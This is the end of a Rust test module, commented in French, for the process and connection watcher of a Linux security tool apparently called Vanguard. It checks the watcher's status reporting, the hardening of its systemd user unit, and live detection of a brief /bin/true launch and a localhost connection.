        let d = crate::socle::dossier_local().join("veilleur-oublier-le-choix");
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        let poser = || {
            std::fs::write(d.join(VOULU), b"").unwrap();
            std::fs::write(d.join(ETAT), b"{}").unwrap();
        };
        poser();
        oublier_le_choix(&Retire::Echoue("toujours en marche (processus 4242)".into()), &d);
        assert!(d.join(VOULU).is_file() && d.join(ETAT).is_file());
        // La note gardée, l'unité retirée : le bilan le dit, au lieu de « coupé, comme par défaut ».
        let ecart = juger_bool(d.join(VOULU).is_file(), Some(false), None, false, Some(true));
        assert!(ecart.probleme.is_some(), "{}", ecart.message);
        for issue in [Retire::Fait, Retire::NonVerifie("pas de réponse".into())] {
            poser();
            oublier_le_choix(&issue, &d);
            assert!(!d.join(VOULU).exists() && !d.join(ETAT).exists(), "{issue:?}");
        }
        let _ = std::fs::remove_dir_all(d);
    }

    #[test]
    fn cinq_etats_au_bilan() {
        let e = etat_vivant();
        let sans_systemd = juger_bool(false, None, None, false, Some(true));
        assert!(!sans_systemd.verifie);
        let coupe = juger_bool(false, Some(false), None, false, Some(false));
        assert!(
            coupe.verifie && coupe.probleme.is_none() && coupe.message.contains("plus ancien"),
            "{}",
            coupe.message
        );
        let disparu = juger_bool(true, Some(false), None, false, Some(true));
        assert_eq!(disparu.probleme, Some(Niveau::Eleve));
        let allume = juger_bool(true, Some(true), Some(&e), true, Some(true));
        assert!(allume.verifie && allume.probleme.is_none(), "{}", allume.message);
        assert!(!allume.message.contains("autre compte"), "{}", allume.message);
        assert!(
            allume
                .message
                .contains("6 parti(s) avant lecture (jamais comptés sains)"),
            "{}",
            allume.message
        );
        let en_pause = Etat {
            en_pause: true,
            listes: Some("liste de ThreatFox non vérifiée".into()),
            ..e.clone()
        };
        let pause = juger_bool(true, Some(true), Some(&en_pause), true, Some(true));
        assert!(
            pause.message.contains("En pause") && pause.message.contains("ThreatFox"),
            "{}",
            pause.message
        );
        // Ce qui n'est pas vérifié n'a jamais le signe vert : en pause, sans fins de prises, avec des pertes, sans
        // une liste.
        assert_eq!(pause.probleme, Some(Niveau::Info));
        for partiel in [
            Etat {
                en_pause: true,
                ..e.clone()
            },
            Etat {
                sans_prises: Some("refusées".into()),
                ..e.clone()
            },
            Etat { perdus: 3, ..e.clone() },
            Etat {
                listes: Some("liste de ThreatFox non vérifiée".into()),
                ..e.clone()
            },
        ] {
            let c = juger_bool(true, Some(true), Some(&partiel), true, Some(true));
            assert_eq!(c.probleme, Some(Niveau::Info), "{}", c.message);
        }
        // Les programmes d'un autre compte, lus par leur ligne seule, sont dits à part.
        let autres = Etat {
            sans_programme: 9,
            ..e.clone()
        };
        let c = juger_bool(true, Some(true), Some(&autres), true, Some(true));
        assert!(c.message.contains("9 d'un autre compte"), "{}", c.message);
        let arrete = Etat {
            raison_arret: Some("erreur de lecture du noyau".into()),
            ..e
        };
        let a_l_arret = juger_bool(true, Some(true), Some(&arrete), false, Some(true));
        assert!(!a_l_arret.verifie && a_l_arret.probleme == Some(Niveau::Moyen));
        assert!(a_l_arret.message.contains("erreur de lecture"), "{}", a_l_arret.message);
        assert!(a_l_arret.correctif.is_some());
    }

    #[test]
    fn precisions_du_menu() {
        for (activee, vivant, pause) in [
            (Some(true), true, true),
            (Some(true), true, false),
            (Some(true), false, false),
            (Some(false), false, false),
            (None, false, true),
        ] {
            assert!(crate::ui::largeur_affichee(precision_de(activee, vivant, pause)) <= 33);
        }
        assert_eq!(precision_de(Some(false), false, true), "coupé");
        assert_eq!(precision_de(Some(true), false, true), "allumé, à l'arrêt");
    }

    #[test]
    fn unite_durcie_et_compatible() {
        for anglais in [false, true] {
            let u = unite_dans("/home/alice/mes 100%/vanguard\"x", anglais);
            assert!(notre_unite(&u), "{u}");
            assert!(u.contains("\nType=simple\n"));
            assert!(
                u.contains("\nExecStart=\"/home/alice/mes 100%%/vanguard\\\"x\" veilleur --servir\n"),
                "{u}"
            );
            assert!(u.contains("\nRestartPreventExitStatus=77\n"));
            // Le programme lance un environnement tokio d'un fil par cœur (16 ici, mesuré : 17 fils en tout) :
            // au-delà de TasksMax, notify-send ne partirait plus.
            assert!(u.contains("\nEnvironment=TOKIO_WORKER_THREADS=1\n") && u.contains("\nTasksMax=16\n"));
            assert!(u.contains("\nRestart=on-failure\n"));
            assert!(u.contains("\nNoNewPrivileges=yes\n"));
            assert!(u.contains("\nRestrictAddressFamilies=AF_UNIX AF_NETLINK\n"));
            assert!(u.contains("\nWantedBy=default.target\n"));
            // Montrée avant l'accord avec un retrait de 4 : tout tient dans 76 colonnes, sauf le chemin du programme.
            for l in u.lines().filter(|l| !l.starts_with("ExecStart=")) {
                assert!(crate::ui::largeur_affichee(l) <= crate::ui::LARGEUR - 4, "{l}");
            }
            for l in u.lines().filter(|l| !l.starts_with('#')) {
                for interdite in [
                    "ProtectSystem",
                    "ProtectHome",
                    "PrivateTmp",
                    "PrivateUsers",
                    "ReadOnlyPaths",
                    "ReadWritePaths",
                    "Protect",
                    "PrivateDevices",
                    "PrivateIPC",
                    "PrivateMounts",
                    "Nice",
                ] {
                    assert!(!l.starts_with(interdite), "{l}");
                }
            }
        }
        assert_ne!(unite_dans("/x", false), unite_dans("/x", true));
    }

    #[test]
    fn retrait_seulement_de_notre_unite() {
        assert!(notre_unite(&unite_dans("/x", false)));
        assert!(notre_unite(&unite_dans("/x", true)));
        assert!(!notre_unite(
            "[Unit]\nDescription=Autre\n# Posé par Vanguard (vanguard veilleur on)\n"
        ));
        assert!(!notre_unite(""));
    }

    /// Sur le vrai noyau : un programme d'une milliseconde et une connexion brève vers la machine elle-même, vus par
    /// le veilleur et manqués par la passe horaire. Sans connecteur ouvert aux comptes ordinaires (espace de noms de
    /// `unshare -rn`, conteneur, noyau plus ancien), l'essai se dit sauté, rien de vérifié, et libtest le compte
    /// pourtant réussi ; avec VANGUARD_EXIGER_VEILLEUR=1, ce même échec fait échouer le test. `outils/verifier.sh` la
    /// pose pour la suite Linux avec Internet (pas pour la passe `unshare -rn`) ; la CI de GitHub ne la pose pas :
    /// l'essai peut y être sauté, il n'y prouve donc rien.
    #[test]
    fn voit_un_lancement_bref_et_une_connexion_breve() {
        let exige = std::env::var_os("VANGUARD_EXIGER_VEILLEUR").is_some_and(|v| v == "1");
        let mut v = match Veilleur::ouvrir() {
            Ok(v) => v,
            Err(refus) => {
                assert!(!exige, "veilleur : {} (VANGUARD_EXIGER_VEILLEUR=1)", refus.raison());
                return crate::essais::saute(&format!("veilleur : {}", refus.raison()));
            }
        };
        assert!(v.prises.is_ok(), "fins de prises : {:?}", v.prises.as_ref().err());
        let marque = format!("--vanguard-essai-{}", std::process::id());
        let ecoute = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = ecoute.local_addr().unwrap().port();
        let mut lance_vu: Option<Lance> = None;
        let mut prise_vue = false;
        let mut partis = 0;
        // Le programme est lancé depuis un autre fil pendant que celui-ci écoute, comme le service tourne pendant que
        // les autres programmes vivent : `commande::lancer` attend la fin du programme et le ramasse, et lu après
        // lui, il serait toujours parti. Trois essais au plus : un programme d'une milliseconde peut partir avant
        // d'être lu, ce qui est compté « parti » et ne prouverait pas qu'on l'a reconnu.
        for _ in 0..3 {
            let ecoute = ecoute.try_clone().unwrap();
            let marque_du_fil = marque.clone();
            let fil = std::thread::spawn(move || {
                std::thread::sleep(Duration::from_millis(150));
                let r = crate::commande::lancer(std::process::Command::new("/bin/true").arg(&marque_du_fil), 10);
                let client = std::net::TcpStream::connect(("127.0.0.1", port)).unwrap();
                let (servi, _) = ecoute.accept().unwrap();
                drop(client);
                drop(servi);
                r.is_some_and(|r| r.code == Some(0))
            });
            let limite = Instant::now() + Duration::from_secs(5);
            while Instant::now() < limite && (lance_vu.is_none() || !prise_vue) {
                for vu in v.tour(Duration::from_millis(100)).unwrap() {
                    match vu {
                        Vu::Lance(l) if l.parent == Some(std::process::id()) => match &l.lecture {
                            Lecture::Complet(p) if p.ligne.as_deref().is_some_and(|x| x.contains(&marque)) => {
                                lance_vu = Some(l);
                            }
                            Lecture::Parti => partis += 1,
                            _ => {}
                        },
                        Vu::Prise(f) if f.locale.port() == port || f.distante.port() == port => prise_vue = true,
                        _ => {}
                    }
                }
            }
            assert!(fil.join().unwrap(), "/bin/true n'a pas réussi");
            if lance_vu.is_some() && prise_vue {
                break;
            }
        }
        let l = lance_vu.expect("/bin/true lancé, jamais vu en entier par le veilleur");
        assert!(prise_vue, "connexion brève vers 127.0.0.1:{port} jamais vue fermée");
        assert!(
            !l.de_vanguard || l.lignee.iter().any(|n| n.contains("vanguard")),
            "{l:?}"
        );
        let pid = l.pid;
        eprintln!(
            "veilleur : /bin/true (PID {pid}, lu en entier, lignée {}) et la connexion vers 127.0.0.1:{port} vus ; {partis} lancement(s) du test partis avant lecture",
            l.lignee.join(" → ")
        );
        // La passe horaire, elle, ne le voit plus : il est parti.
        let (liste, _) = chasse::en_marche().unwrap();
        assert!(!liste.iter().any(|p| p.pid == pid));
    }
}
